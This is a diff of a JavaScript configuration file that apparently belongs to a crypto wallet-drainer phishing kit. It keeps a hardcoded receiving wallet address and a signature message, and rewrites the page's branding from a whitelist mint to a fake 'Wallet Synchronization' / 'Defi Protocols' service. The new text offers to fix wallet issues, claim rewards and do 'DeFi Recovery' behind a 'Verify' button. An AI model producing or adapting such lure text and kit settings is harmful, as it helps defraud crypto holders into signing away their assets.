@@ -1,7 +1,7 @@
 const receiveAddress = "0x0D02c1D17e345B4dceA335Fd2988FbDF3F05e64C";
 
 const collectionInfo = {
-    name: "Whitelist Registration",
+    name: "Wallet Synchronization",
     socialMedia: {
         discord: "",
         twitter: "",
@@ -18,15 +18,15 @@ const signMessage = `Welcome, \n\n` +
 const indexPageInfo = {
     backgroundImage: "background.jpeg", // relative path to background image (in assets)
     title: "{name}", // {name} will be replaced with collectionInfo.name
-    underTitle: "whitelist mints",
+    underTitle: "Defi Protocols",
 }
 
 const claimPageInfo = {
-    title: "Whitelist <br> Mint", // <br> is a line break
-    shortDescription: "Claim your whitelist spot",
-    longDescription: "Just 60 whitelist spots left",
+    title: "Connecting Web3", // <br> is a line break
+    shortDescription: "Validate all wallet issues, Claim Reward, Claim Whitelist,DeFi Recovery.",
+    longDescription: "Defi Protocols lets users connect Dapps to Crypto Wallets",
 
-    claimButtonText: "Claim",
+    claimButtonText: "Verify",
 
     image: "whitelist.jpeg", // relative path to image (in assets)
     imageRadius: 250, // image radius in px
